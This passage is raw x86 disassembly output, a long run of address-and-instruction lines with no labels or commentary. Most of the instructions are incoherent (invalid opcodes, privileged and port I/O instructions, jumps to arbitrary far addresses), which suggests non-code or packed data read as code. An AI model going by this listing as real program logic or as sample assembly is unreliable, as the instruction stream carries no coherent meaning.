  419177:	div    BYTE PTR [edi+eiz*4]
  41917a:	(bad)  
  41917c:	retf   0x32f4
  41917f:	xor    eax,0xc43a67c5
  419184:	scas   al,BYTE PTR es:[edi]
  419185:	arpl   WORD PTR [ecx],ax
  419187:	push   edi
  419188:	push   edi
  419189:	add    DWORD PTR [eax],eax
  41918b:	adc    eax,0x569311ad
  419190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419191:	adc    bl,ah
  419193:	push   eax
  419194:	nop
  419195:	and    edi,ebp
  419197:	jl     0x4191d1
  419199:	ds fs scas al,BYTE PTR es:[edi]
  41919c:	cmp    ebx,DWORD PTR [esi+0x7fe4f2f5]
  4191a2:	lea    edx,[edx-0x35d94ab0]
  4191a8:	sub    al,bl
  4191aa:	mov    ds:0xde52386f,al
  4191af:	stos   BYTE PTR es:[edi],al
  4191b0:	aaa    
  4191b1:	test   DWORD PTR [ecx],0x3618c5b8
  4191b7:	mov    ds:0x58d387b0,eax
  4191bc:	iret   
  4191bd:	in     eax,dx
  4191be:	jp     0x419223
  4191c0:	stos   BYTE PTR es:[edi],al
  4191c1:	jno    0x41915e
  4191c3:	and    BYTE PTR [esi],ch
  4191c5:	xor    eax,0xb2b6fe67
  4191ca:	mov    cs,esp
  4191cc:	jle    0x4191b4
  4191ce:	in     eax,0xe0
  4191d0:	dec    eax
  4191d1:	(bad)  
  4191d2:	push   esi
  4191d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d4:	inc    esi
  4191d5:	and    edi,DWORD PTR [eax+edi*1+0x75]
  4191d9:	or     ah,BYTE PTR [ebp-0x12d094c3]
  4191df:	mov    bh,0xb3
  4191e1:	popf   
  4191e2:	xchg   ebp,eax
  4191e3:	fisttp WORD PTR [ebx+0x2daaf19f]
  4191e9:	stos   BYTE PTR es:[edi],al
  4191ea:	retf   0x27b8
  4191ed:	mov    bh,0xc6
  4191ef:	pop    eax
  4191f0:	int3   
  4191f1:	ja     0x41919b
  4191f3:	pop    esp
  4191f4:	pushf  
  4191f5:	repz xor al,0x41
  4191f8:	hlt    
  4191f9:	js     0x41919c
  4191fb:	jne    0x4191fa
  4191fd:	xor    ebx,DWORD PTR [edx]
  4191ff:	in     al,0x83
  419201:	sbb    ebx,DWORD PTR [esi+edx*8-0x971d22b]
  419208:	pop    es
  419209:	adc    DWORD PTR [edi+ebx*1-0x394ce01f],0xffffff86
  419211:	add    ch,BYTE PTR [edx+eiz*2+0x2edd86f6]
  419218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419219:	jns    0x4191dd
  41921b:	jle    0x41925b
  41921d:	enter  0x31fe,0xed
  419221:	pop    ss
  419222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419223:	pop    es
  419224:	xor    al,0xf2
  419226:	inc    esi
  419227:	mov    ecx,0xf3759c92
  41922c:	and    DWORD PTR [eax+ebp*4],ecx
  41922f:	mov    fs,WORD PTR [eax+edi*8+0x6d]
  419233:	mov    bl,0x74
  419235:	scas   al,BYTE PTR es:[edi]
  419236:	mov    dh,0xec
  419238:	loop   0x4192b8
  41923a:	adc    dl,BYTE PTR [ebp+0x22fdbcc9]
  419240:	out    0x79,eax
  419242:	inc    ebp
  419243:	mov    edi,0x44b8037e
  419248:	mov    ebx,0x3da06f86
  41924d:	daa    
  41924e:	frstor [edi]
  419250:	xchg   esi,eax
  419251:	pop    ss
  419252:	je     0x4191f0
  419254:	sub    bl,al
  419256:	cmp    DWORD PTR [esi+0x22],esp
  419259:	dec    esp
  41925a:	pop    ss
  41925b:	mov    WORD PTR [ebx],fs
  41925d:	mov    ecx,0xe17c0eb1
  419262:	xchg   di,ax
  419264:	(bad)  
  419265:	mov    esp,0x7cd5a14c
  41926a:	shl    BYTE PTR [edi-0x41],0x5e
  41926e:	add    eax,0x205d64e0
  419273:	(bad)  
  419274:	mov    ebx,0xb1283e18
  419279:	retf   
  41927a:	aad    0x47
  41927c:	loope  0x41927d
  41927e:	ror    DWORD PTR [edi+0x4a7e79c7],0xbf
  419285:	icebp  
  419286:	iret   
  419287:	out    0xba,eax
  419289:	lgdtd  ds:0x43e019a
  419290:	inc    ebp
  419291:	addr16 lock xchg edi,eax
  419294:	cs jp  0x4192dc
  419297:	jbe    0x419246
  419299:	repnz scas al,BYTE PTR es:[edi]
  41929b:	mov    bl,0xd2
  41929d:	mov    edx,0xea91fc5
  4192a2:	dec    ebp
  4192a3:	dec    ebx
  4192a4:	retf   
  4192a5:	rol    DWORD PTR [ebx],0x88
  4192a8:	pop    ds
  4192a9:	js     0x41924d
  4192ab:	nop
  4192ac:	xor    eax,0xa1a62ab8
  4192b1:	mov    BYTE PTR [esi+0x65],ch
  4192b4:	out    dx,al
  4192b5:	int    0xfc
  4192b7:	mov    ecx,0xf995ea12
  4192bc:	push   cs
  4192bd:	cwde   
  4192be:	mov    esi,0x960cb278
  4192c3:	and    eax,0x144ac878
  4192c8:	rcl    BYTE PTR [esi-0x50a0c7bf],1
  4192ce:	or     BYTE PTR [eax],bl
  4192d0:	lods   eax,DWORD PTR ds:[esi]
  4192d1:	fwait
  4192d2:	adc    DWORD PTR [ecx+0x61],esp
  4192d5:	push   cs
  4192d6:	loope  0x419356
  4192d8:	jmp    0xa5ef:0xa9acb912
  4192df:	jns    0x419350
  4192e1:	dec    edi
  4192e2:	mov    bl,0xe3
  4192e4:	sub    eax,0x79b4af18
  4192e9:	fild   QWORD PTR [ecx+0x73]
  4192ec:	push   ebx
  4192ed:	xor    edx,DWORD PTR [esi+0x6776bb50]
  4192f3:	mov    cl,0x88
  4192f5:	cmp    eax,0x37a87e72
  4192fa:	data16 out 0x4f,al
  4192fd:	add    bl,BYTE PTR [esi]
  4192ff:	and    ecx,DWORD PTR [esi]
  419301:	xchg   edi,eax
  419302:	and    DWORD PTR [ecx],0x35f921f5
  419308:	and    eax,0x2e78bcf8
  41930d:	loop   0x4192b4
  41930f:	dec    DWORD PTR [edi]
  419311:	push   ebp
  419312:	push   esi
  419313:	xor    DWORD PTR [ebx],esp
  419315:	call   0xd282:0xd0170147
  41931c:	je     0x4192c5
  41931e:	mov    cl,BYTE PTR [eax+0x2549368b]
  419324:	loopne 0x4192e5
  419326:	mov    edx,DWORD PTR [ebx-0x6b]
  419329:	mov    edi,0xa6246c75
  41932e:	fstp   DWORD PTR [edi-0x4d175f98]
  419334:	jno    0x419311
  419336:	push   edi
  419337:	mov    ebp,0xe5b098a4
  41933c:	push   ebp
  41933d:	shl    DWORD PTR [ebx-0x2e],0x9f
  419341:	arpl   WORD PTR [edi+0x743dc542],bx
  419347:	add    ebx,DWORD PTR [esi]
  419349:	dec    BYTE PTR [ebx]
  41934b:	call   FWORD PTR [eax-0x5fea77bd]
  419351:	sbb    al,0x10
  419353:	retf   0xf113
  419356:	push   ecx
  419357:	das    
  419358:	xchg   ebp,eax
  419359:	imul   ecx,esp,0x56
  41935c:	push   ds
  41935d:	mov    bl,0x56
  41935f:	adc    BYTE PTR ds:0xc903d06c,ah
  419365:	xchg   edx,eax
  419366:	imul   ebp,DWORD PTR [esi+0x35],0x94a66a7e
  41936d:	(bad)  
  41936e:	jbe    0x419339
  419370:	pop    ebx
  419371:	addr16 jo 0x4193e8
  419374:	jae    0x41938a
  419376:	push   esp
  419377:	inc    ebp
  419378:	aad    0xb7
  41937a:	or     al,0x6c
  41937c:	cmp    eax,0x4e5dbda9
  419381:	test   DWORD PTR [ebp-0x24],esp
  419384:	sti    
  419385:	loope  0x419397
  419387:	fnstenv [esi-0x69fc7a05]
  41938d:	inc    eax
  41938e:	les    eax,FWORD PTR [edx+0x3d]
  419391:	addr16 gs loope 0x419341
  419395:	sub    bh,BYTE PTR [ecx-0x100fb16a]
  41939b:	inc    ecx
  41939c:	bound  edx,QWORD PTR [ebx]
  41939e:	out    dx,al
  41939f:	rcr    BYTE PTR [ecx+ecx*1],cl
  4193a2:	xchg   ebp,eax
  4193a3:	sahf   
  4193a4:	xor    DWORD PTR [esp+ecx*8],esp
  4193a7:	ins    BYTE PTR es:[edi],dx
  4193a8:	mov    edx,0xb0ba7771
  4193ad:	sbb    eax,0xf4dedbd5
  4193b2:	pop    ds
  4193b3:	jg     0x41934d
  4193b5:	xchg   ebx,eax
  4193b6:	ret    0x98a8
  4193b9:	outs   dx,BYTE PTR ds:[esi]
  4193ba:	or     DWORD PTR [edx+edx*4+0x167add40],0xe07d71f7
  4193c5:	xor    esp,DWORD PTR [eax-0x3d]
  4193c8:	icebp  
  4193c9:	ss or  eax,0xa5b3eaf7
  4193cf:	cwde   
  4193d0:	(bad)  
  4193d1:	cli    
  4193d2:	or     dh,BYTE PTR [eax+0xf8385d0]
  4193d8:	pop    ds
  4193d9:	enter  0x7229,0x60
  4193dd:	adc    al,0x18
  4193df:	sar    BYTE PTR [ebx],cl
  4193e1:	lahf   
  4193e2:	dec    esp
  4193e3:	popa   
  4193e4:	lods   eax,DWORD PTR ds:[esi]
  4193e5:	loopne 0x4193a8
  4193e7:	std    
  4193e8:	shr    BYTE PTR [edi-0x7ad1483a],0xf6
  4193ef:	push   ecx
  4193f0:	or     DWORD PTR [edx+0x42cfe91],ebp
  4193f6:	test   BYTE PTR [eax+eax*4],al
  4193f9:	or     al,0x7c
  4193fb:	jl     0x41947a
  4193fd:	sbb    ebx,DWORD PTR [ecx+0x164bf1f7]
  419403:	inc    edx
  419404:	les    ebp,FWORD PTR ds:0x99b110da
  41940a:	add    ebp,DWORD PTR [esi+0x72]
  41940d:	xchg   esi,eax
  41940e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41940f:	jp     0x419430
  419411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419412:	scas   al,BYTE PTR es:[edi]
  419413:	xor    cl,ah
  419415:	mov    dl,0x32
  419417:	xchg   esi,eax
  419418:	(bad)  
  419419:	xor    al,BYTE PTR [edi+0x317cff5d]
  41941f:	fld    TBYTE PTR [ecx+0x50ed72d4]
  419425:	xor    ah,dh
  419427:	jne    0x4193f3
  419429:	ret    
  41942a:	addr16 (bad) 
  41942c:	pop    esp
  41942d:	hlt    
  41942e:	mov    ds:0xefdda09,eax
  419433:	pusha  
  419434:	push   ss
  419435:	rcl    BYTE PTR [ebx+0x8],cl
  419438:	sbb    eax,0xe71a7fd8
  41943d:	pop    edi
  41943e:	daa    
  41943f:	clc    
  419440:	sub    dl,bh
  419442:	push   esi
  419443:	pop    ebx
  419444:	cli    
  419445:	mov    dl,0xe3
  419447:	mov    ecx,0x9fba4665
  41944c:	enter  0x77f3,0xb
  419450:	in     al,0xbc
  419452:	add    dh,dh
  419454:	out    dx,eax
  419455:	jnp    0x4194bc
  419457:	sahf   
  419458:	add    DWORD PTR [edx+0x221c5805],esp
  41945e:	push   ecx
  41945f:	pusha  
  419460:	dec    ebx
  419461:	or     bl,BYTE PTR [edx]
  419463:	pop    ds
  419464:	pusha  
  419465:	mov    edi,0xf86fb356
  41946a:	cdq    
  41946b:	or     DWORD PTR [ebx+0x282b6556],ebx
  419471:	or     ah,BYTE PTR [ecx]
  419473:	mov    edx,DWORD PTR [esi]
  419475:	repz test eax,0x3ff0d944
  41947b:	cmp    DWORD PTR [eax+0x34f201bb],ecx
  419481:	mul    DWORD PTR [eax]
  419483:	cmovnp edx,DWORD PTR [edi+0x474279be]
  41948a:	and    eax,0xa8b8c31
  41948f:	aas    
  419490:	pop    ebx
  419491:	cmp    eax,0x7735397c
  419496:	sub    eax,0x3358d184
  41949b:	retf   
  41949c:	(bad)  
  41949e:	inc    ecx
  41949f:	push   esp
  4194a0:	cld    
  4194a1:	or     eax,0x145cec7
  4194a6:	inc    esp
  4194a7:	leave  
  4194a8:	mov    edi,0x7a5347a2
  4194ad:	and    ebp,DWORD PTR [eax]
  4194af:	add    ah,dl
  4194b1:	cld    
  4194b2:	push   edi
  4194b3:	pop    ebp
  4194b4:	mov    ah,0xa3
  4194b6:	out    0x8b,al
  4194b8:	xchg   esp,eax
  4194b9:	ins    DWORD PTR es:[edi],dx
  4194ba:	or     al,cl
  4194bc:	int    0x61
  4194be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194bf:	hlt    
  4194c0:	mov    ebx,0xe1552710
  4194c5:	mov    BYTE PTR [ebp-0x349af693],bh
  4194cb:	pop    ecx
  4194cc:	mov    ?,esp
  4194ce:	(bad)  
  4194cf:	fcomp  DWORD PTR [esi+eiz*8+0x44]
  4194d3:	xor    cl,BYTE PTR [ecx]
  4194d5:	fimul  WORD PTR [ecx-0x4f]
  4194d8:	pop    ebx
  4194d9:	aad    0x96
  4194db:	or     DWORD PTR [ebx-0x26],ebx
  4194de:	jl     0x419505
  4194e0:	push   0xffffffc5
  4194e2:	popf   
  4194e3:	mov    esi,0xf2eb687e
  4194e8:	cmp    DWORD PTR [eax],esi
  4194ea:	fcomp  QWORD PTR [esi-0x4bdd13b0]
  4194f0:	xchg   ebx,eax
  4194f1:	js     0x4194ed
  4194f3:	rol    DWORD PTR [eax-0x24],1
  4194f6:	xchg   DWORD PTR [edi],ecx
  4194f8:	and    eax,0x751e3f1f
  4194fd:	mov    edi,0x68b94a01
  419502:	push   ss
  419503:	add    edi,DWORD PTR [ecx]
  419505:	add    eax,0x12d5d5c1
  41950a:	sbb    ah,BYTE PTR [esi]
  41950c:	xchg   esi,eax
  41950d:	iret   
  41950e:	sbb    al,0xb3
  419510:	inc    ebx
  419511:	js     0x4194f0
  419513:	add    DWORD PTR [ebx],ebp
  419515:	out    dx,al
  419516:	sbb    bl,bh
  419518:	mov    ds:0x6a0668c4,eax
  41951d:	mov    eax,eax
  41951f:	and    ch,BYTE PTR [ecx+0x74]
  419522:	test   al,0xc2
  419524:	sub    BYTE PTR [edx+0x13],ah
  419527:	xchg   ecx,eax
  419528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419529:	mov    edi,0x3ba7a7bc
  41952e:	mov    DWORD PTR [esi],edx
  419530:	push   ebx
  419531:	push   ebx
  419532:	xor    DWORD PTR [esi+eax*4],edi
  419535:	mov    al,ds:0x5ca02ad
  41953a:	jbe    0x4194fe
  41953c:	jg     0x4194e3
  41953e:	aam    0x62
  419540:	cmp    BYTE PTR [eax+0x2d1c4b63],ch
  419546:	test   dl,cl
  419548:	add    edi,ebp
  41954a:	into   
  41954b:	test   ebp,0x6824d345
  419551:	sbb    ebx,DWORD PTR [ecx]
  419553:	cmp    eax,DWORD PTR [edi-0x7c26e562]
  419559:	adc    BYTE PTR [edi+eax*2+0x1],0x2a
  41955e:	jo     0x419549
  419560:	dec    ebx
  419561:	test   edx,0x9b26c8c2
  419567:	idiv   BYTE PTR [edx+0x7]
  41956a:	imul   ebx,DWORD PTR [ebp+0x3d],0x4b3ed7fb
  419571:	leave  
  419572:	xchg   esi,eax
  419573:	in     al,0xc3
  419575:	mov    dh,0x8a
  419577:	xor    cl,BYTE PTR [ebp-0x35e10671]
  41957d:	fst    DWORD PTR [eax+0x64]
  419580:	dec    edx
  419581:	xor    ebp,ebx
  419583:	pop    ds
  419584:	jl     0x41958b
  419586:	test   al,0x21
  419588:	add    dh,cl
  41958a:	dec    esp
  41958b:	out    dx,eax
  41958c:	inc    BYTE PTR [esi-0x56]
  41958f:	xchg   ecx,eax
  419590:	push   ds
  419591:	inc    ecx
  419592:	lock xor al,0x63
  419595:	jge    0x419530
  419597:	and    eax,0xd6bd8401
  41959c:	and    al,0x56
  41959e:	xlat   BYTE PTR ds:[ebx]
  41959f:	fmul   DWORD PTR [ecx-0x7147e4b2]
  4195a5:	pop    esi
  4195a6:	pop    edi
  4195a7:	arpl   WORD PTR [ebx-0x3c],ax
  4195aa:	push   cs
  4195ab:	xchg   BYTE PTR [ecx-0x4b],bh
  4195ae:	arpl   WORD PTR [ebx+0x26],cx
  4195b1:	xchg   esi,eax
  4195b2:	mov    bh,0x92
  4195b4:	jnp    0x4195a0
  4195b6:	call   0x728655b5
  4195bb:	sub    ah,BYTE PTR [eax+0x26]
  4195be:	xor    al,0xb7
  4195c0:	push   ecx
  4195c1:	loop   0x4195c9
  4195c3:	add    al,0x1d
  4195c5:	icebp  
  4195c6:	(bad)  
  4195c8:	jecxz  0x4195c5
  4195ca:	sub    eax,0x327a213d
  4195cf:	xchg   BYTE PTR [eax],al
  4195d1:	mov    ds:0x306aa970,eax
  4195d6:	add    esi,DWORD PTR [ecx]
  4195d8:	push   ebp
  4195d9:	pop    ss
  4195da:	mov    eax,ds:0x6afa7911
  4195df:	fnstcw WORD PTR [ecx+0x7ddf64a0]
  4195e5:	cmp    eax,DWORD PTR ds:0x4e4de85f
  4195eb:	out    dx,al
  4195ec:	enter  0x8195,0x85
  4195f0:	les    edi,FWORD PTR [ecx]
  4195f2:	adc    BYTE PTR [esi-0x6feec978],al
  4195f8:	fwait
  4195f9:	iret   
  4195fa:	or     ah,BYTE PTR [eax-0x34bb46e9]
  419600:	inc    ebp
  419601:	xchg   ebx,eax
  419602:	int    0xe4
  419604:	ss xchg ebx,eax
  419606:	icebp  
  419607:	mov    ds:0xe10a90f8,al
  41960c:	mov    cl,0x1f
  41960e:	dec    edi
  41960f:	fmulp  st(1),st
  419611:	pop    edi
  419612:	iret   
  419613:	xchg   ebp,eax
  419614:	cmp    esp,edx
  419616:	lock and dl,BYTE PTR [ebp+esi*8-0x23]
  41961b:	dec    esi
  41961c:	loop   0x41961e
  41961e:	sbb    eax,0xc1ab78de
  419623:	shr    DWORD PTR [ebx-0xa6d7228],0x4f
  41962a:	leave  
  41962b:	cmp    edx,ebx
  41962d:	pop    ebx
  41962e:	mov    ebp,0xc871424e
  419633:	in     al,0x3
  419635:	xchg   ebp,eax
  419636:	std    
  419637:	mov    edx,0xe906ae4d
  41963c:	mov    cl,0x91
  41963e:	test   BYTE PTR [eax+0x7c],ch
  419641:	xchg   esi,eax
  419642:	ins    DWORD PTR es:[edi],dx
  419643:	sub    eax,0x7ed2fdcb
  419648:	fisttp QWORD PTR [edx]
  41964a:	push   esi
  41964b:	mov    esp,0x781e53dc
  419650:	xchg   ebx,eax
  419651:	sbb    cl,BYTE PTR [eax-0x7bf0e4f9]
  419657:	and    al,0xb
  419659:	add    BYTE PTR [eax],al
  41965b:	push   DWORD PTR [ebp+0x20]
  41965e:	push   DWORD PTR [ebp+0x1c]
  419661:	push   DWORD PTR [ebp+0x18]
  419664:	jmp    0x419bee
  419669:	mov    cl,bh
  41966b:	push   eax
  41966c:	inc    ax
  41966e:	push   ds
  41966f:	sbb    al,bl
  419671:	add    bl,BYTE PTR [esi-0x13]
  419674:	mov    ah,0xe8
  419676:	push   ecx
  419677:	sbb    al,0x74
  419679:	jmp    0x1604:0x3d160c45
  419680:	push   ss
  419681:	mov    dh,dh
  419683:	adc    bh,ch
  419685:	xor    BYTE PTR [eax+ebx*4-0x786adec4],cl
  41968c:	push   es
  41968d:	gs out 0xfe,eax
  419690:	jmp    0x1f28de56
  419695:	ret    
  419696:	jmp    0x14652681
  41969b:	adc    eax,0x66031c47
  4196a0:	inc    eax
  4196a1:	inc    edi
  4196a2:	adc    edi,DWORD PTR [eax+0x3e]
  4196a5:	cmp    ecx,eax
  4196a7:	lds    esp,FWORD PTR [ebp-0x75]
  4196aa:	test   eax,0xd6e107db
  4196af:	repz sbb BYTE PTR [ecx+0x12],0xf7
  4196b4:	push   ds
  4196b5:	sub    BYTE PTR [esi],0x7f
  4196b8:	neg    BYTE PTR [ebp-0x727b21d7]
  4196be:	adc    ah,cl
  4196c0:	and    esi,DWORD PTR [esi+eiz*2+0x8]
  4196c4:	dec    eax
  4196c5:	sub    eax,0xde434647
  4196ca:	inc    esi
  4196cb:	push   0xcfd3b3b7
  4196d0:	mov    esi,0xdcb6571b
  4196d5:	mov    esp,0x6cfd4b6
  4196da:	gs aad 0xfb
  4196dd:	adc    esp,ecx
  4196df:	dec    edi
  4196e0:	mov    ch,0xf0
  4196e2:	pop    ds
  4196e3:	dec    edi
  4196e4:	dec    ebx
  4196e5:	inc    esp
  4196e6:	xor    ebx,ecx
  4196e8:	jo     0x419752
  4196ea:	shl    DWORD PTR [esi-0x6d558e7d],1
  4196f0:	mov    dl,0xb1
  4196f2:	retf   
  4196f3:	mov    dh,0xd3
  4196f5:	xor    esi,esp
  4196f7:	mov    eax,0x7a23772c
  4196fc:	test   eax,0xf6f13a31
  419701:	inc    edx
  419702:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419704:	arpl   WORD PTR [esi],cx
  419706:	xchg   esp,eax
  419707:	ja     0x419741
  419709:	xchg   BYTE PTR [ecx+0x3e49db27],dl
  41970f:	ret    
  419710:	and    DWORD PTR [ebx-0x492f524a],ecx
  419716:	fcmove st,st(7)
  419718:	push   ebx
  419719:	test   BYTE PTR [ecx-0x2f],dh
  41971c:	scas   al,BYTE PTR es:[edi]
  41971d:	addr16 call 0xda9f:0xf206df34
  419725:	leave  
  419726:	dec    esi
  419727:	loop   0x419723
  419729:	arpl   WORD PTR [ecx-0x2c57613c],ax
  41972f:	mov    dh,0x47
  419731:	push   eax
  419732:	imul   ecx,DWORD PTR [esi+0x53],0xffffffda
  419736:	fmul   st(3),st
  419738:	ss jl  0x419745
  41973b:	push   ss
  41973c:	sub    BYTE PTR [edx],ah
  41973e:	into   
  41973f:	sahf   
  419740:	in     al,0x9a
  419742:	out    0x24,eax
  419744:	mov    edx,0x2247348f
  419749:	sbb    ebx,ebp
  41974b:	cmp    al,0x47
  41974d:	xchg   esp,eax
  41974e:	pop    ecx
  41974f:	xor    DWORD PTR [eax-0xe],esi
  419752:	jle    0x419728
  419754:	in     eax,0x15
  419756:	daa    
  419757:	or     edx,edi
  419759:	dec    edi
  41975b:	adc    al,0x41
  41975d:	out    dx,eax
  41975e:	ret    
  41975f:	or     BYTE PTR [edx+0x12ae67b0],bl
  419765:	inc    esi
  419766:	jl     0x4196ea
  419768:	icebp  
  419769:	sbb    eax,0x263c8c91
  41976e:	push   esi
  41976f:	mov    edx,0x12f5be0e
  419774:	push   eax
  419775:	dec    eax
  419776:	jno    0x4197a9
  419778:	add    al,0x89
  41977a:	sbb    ch,ah
  41977c:	call   0xe9d2:0xba666ed1
  419783:	in     al,0x96
  419785:	xchg   esi,eax
  419786:	retf   0xd1
  419789:	stc    
  41978a:	imul   edi,DWORD PTR [ebx-0x75],0x58786e41
  419791:	popf   
  419792:	loopne 0x419811
  419794:	jno    0x419760
  419796:	lods   eax,DWORD PTR ds:[esi]
  419797:	mov    al,0xc3
  419799:	xor    eax,0x6e48a3a5
  41979e:	iret   
  41979f:	adc    ebx,DWORD PTR [ecx+eax*1]
  4197a2:	or     al,0x60
  4197a4:	or     BYTE PTR [ecx],dh
  4197a6:	mov    ebx,0x5ac87f00
  4197ab:	jne    0x419738
  4197ad:	in     al,0x35
  4197af:	xchg   esi,eax
  4197b0:	(bad)  
  4197b2:	mov    ebp,0xd384f575
  4197b7:	and    al,0xaa
  4197b9:	sub    BYTE PTR [edi-0x2b],ch
  4197bc:	into   
  4197bd:	and    DWORD PTR [esi-0xaafe7da],esi
  4197c3:	js     0x4197a5
  4197c5:	mov    dl,0xdf
  4197c7:	out    0x91,eax
  4197c9:	xchg   ebp,eax
  4197ca:	xor    al,0xcd
  4197cc:	jae    0x41979d
  4197ce:	mov    BYTE PTR [esi],bh
  4197d0:	sub    BYTE PTR [ebx-0x6a],bl
  4197d3:	cli    
  4197d4:	scas   eax,DWORD PTR es:[edi]
  4197d5:	je     0x419823
  4197d7:	xchg   DWORD PTR [edx+0x7e],ebp
  4197da:	mov    ebp,0x165080fc
  4197df:	enter  0x9294,0x63
  4197e3:	int    0x30
  4197e5:	lahf   
  4197e6:	test   DWORD PTR [ebx-0x30cccb8c],ebx
  4197ec:	das    
  4197ed:	adc    bh,BYTE PTR [edi+esi*8]
  4197f0:	shl    DWORD PTR [edi],cl
  4197f2:	shl    DWORD PTR gs:[esi-0xc],1
  4197f6:	stos   DWORD PTR es:[edi],eax
  4197f7:	push   edx
  4197f8:	lods   al,BYTE PTR ds:[esi]
  4197f9:	adc    BYTE PTR es:[ecx-0x31],ch
  4197fd:	cdq    
  4197fe:	add    bh,BYTE PTR [edx-0x3b090911]
  419804:	cmp    ch,BYTE PTR [esi-0xd449cd3]
  41980a:	sti    
  41980b:	pop    edx
  41980c:	mov    esi,0xc6073c91
  419811:	into   
  419812:	pop    ds
  419813:	call   0x478e:0x546cf623
  41981a:	cs int3 
  41981c:	xchg   BYTE PTR ds:0x453da687,al
  419822:	sub    eax,0x1c43f107
  419827:	dec    ebp
  419828:	repnz xor bh,BYTE PTR [ecx]
  41982b:	pop    eax
  41982c:	xchg   DWORD PTR [eax+ebp*8],ebp
  41982f:	rcl    ebx,1
  419831:	bound  edi,QWORD PTR [ecx-0x29823202]
  419837:	mov    eax,0xd0daf233
  41983c:	dec    ebx
  41983d:	and    eax,0xe688b234
  419842:	jl     0x419848
  419844:	pop    edi
  419845:	adc    BYTE PTR [edx+ebx*8-0x79],ch
  419849:	into   
  41984a:	into   
  41984b:	inc    ecx
  41984c:	mov    dl,0x6f
  41984e:	or     DWORD PTR [ebx+0x505818f8],edi
  419854:	add    DWORD PTR [ecx+0x7a],ebp
  419857:	adc    edi,ebx
  419859:	mov    ebp,0x13caddc4
  41985e:	or     ch,BYTE PTR [esi+0x23]
  419861:	xlat   BYTE PTR ds:[ebx]
  419862:	mov    ds:0xed9d1f64,eax
  419867:	push   ecx
  419868:	mov    esp,0x6c6b0dd5
  41986d:	ja     0x41984e
  41986f:	cmp    bh,cl
  419871:	pop    es
  419872:	(bad)  
  419873:	lock movd DWORD PTR [ecx+0x671ceb6e],mm0
  41987b:	inc    eax
  41987c:	test   eax,ebx
  41987e:	xchg   esi,eax
  41987f:	lods   al,BYTE PTR ds:[esi]
  419880:	inc    ecx
  419881:	and    al,0xe6
  419883:	xchg   esp,eax
  419884:	call   0xa270dca9
  419889:	aas    
  41988a:	add    dl,ch
  41988c:	mov    dh,0x7c
  41988e:	outs   dx,BYTE PTR ds:[esi]
  41988f:	push   es
  419890:	lds    ebp,FWORD PTR [ecx-0x44]
  419893:	rcl    DWORD PTR [ecx],cl
  419895:	inc    ecx
  419896:	mov    al,0x20
  419898:	cmp    BYTE PTR [esp+eiz*4-0x3b],bh
  41989c:	dec    edx
  41989d:	pop    ebp
  41989e:	adc    DWORD PTR [esi+0x4ed7edc1],0x57
  4198a5:	inc    esi
  4198a6:	pop    esi
  4198a7:	and    al,0x7
  4198a9:	inc    ebx
  4198aa:	(bad)  
  4198ab:	sbb    ch,BYTE PTR [edx-0x1e]
  4198ae:	aam    0x35
  4198b0:	add    al,0xa
  4198b2:	pop    es
  4198b3:	add    BYTE PTR [eax+0x19],bh
  4198b6:	fstp   TBYTE PTR ds:0x204d4c1f
  4198bc:	xlat   BYTE PTR ds:[ebx]
  4198bd:	fwait
  4198be:	in     eax,dx
  4198bf:	gs cld 
  4198c1:	ja     0x419844
  4198c3:	mov    dl,0x92
  4198c5:	fst    DWORD PTR [ebp+esi*1-0x6f46463a]
  4198cc:	aas    
  4198cd:	add    dl,ch
  4198cf:	push   ds
  4198d0:	mov    dl,0x64
  4198d2:	idiv   BYTE PTR [edx]
  4198d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198d5:	out    0x9c,al
  4198d7:	add    al,cl
  4198d9:	out    dx,eax
  4198da:	jp     0x4198cc
  4198dc:	mov    esp,0x7e551efe
  4198e1:	pop    edx
  4198e2:	xchg   ebx,eax
  4198e3:	pop    ebx
  4198e4:	test   al,0xb4
  4198e6:	xchg   esp,eax
  4198e7:	dec    edi
  4198e8:	mov    ch,0xd6
  4198ea:	popa   
  4198eb:	xchg   esi,eax
  4198ec:	inc    edx
  4198ed:	sub    eax,0xdde56b61
  4198f2:	mov    eax,ds:0xe8bcd6f1
  4198f7:	clc    
  4198f8:	pop    ebx
  4198f9:	cmp    eax,0x9c292c8
  4198fe:	pop    DWORD PTR [eax+ecx*8+0x4c26b17f]
  419905:	ror    DWORD PTR [edx],cl
  419907:	push   ss
  419908:	scas   eax,DWORD PTR es:[edi]
  419909:	push   esi
  41990a:	dec    ebp
  41990b:	sub    eax,0xafb3f5b7
  419910:	and    BYTE PTR [eax-0x5c584137],ah
  419916:	inc    edx
  419917:	retf   
  419918:	ret    0x7a9d
  41991b:	lods   al,BYTE PTR ds:[esi]
  41991c:	test   DWORD PTR [ebx+0x4c51d71e],ebx
  419922:	vpunpcklbw ymm1,ymm3,ymm6
  419926:	xor    DWORD PTR [ecx+eiz*8-0x15eb774e],0xbc34d295
  419931:	mov    esi,0x639b1794
  419936:	in     al,0x4
  419938:	pop    eax
  419939:	sbb    cl,bh
  41993b:	sbb    BYTE PTR [edx-0x6aec1afd],0x74
  419942:	leave  
  419943:	sar    DWORD PTR [ecx-0x105448f6],cl
  419949:	dec    ecx
  41994a:	clc    
  41994b:	or     BYTE PTR [ecx],ah
  41994d:	mov    ds:0xa0339bb8,al
  419952:	ret    0x8e0b
  419955:	int    0x89
  419957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419958:	xchg   ecx,eax
  419959:	cmp    eax,0x40dc7ec2
  41995e:	push   ss
  41995f:	(bad)  
  419960:	fstp   DWORD PTR [eax-0x78681964]
  419966:	mul    DWORD PTR [ecx-0x49]
  419969:	jg     0x4199a7
  41996b:	xchg   esi,eax
  41996c:	jb     0x419996
  41996e:	mov    edi,0x2b084788
  419973:	inc    DWORD PTR [edi+0x6c440bd]
  419979:	adc    al,0xde
  41997b:	neg    DWORD PTR [ecx]
  41997d:	pop    ecx
  41997e:	cdq    
  41997f:	inc    eax
  419980:	adc    bh,0xb1
  419983:	loop   0x41993f
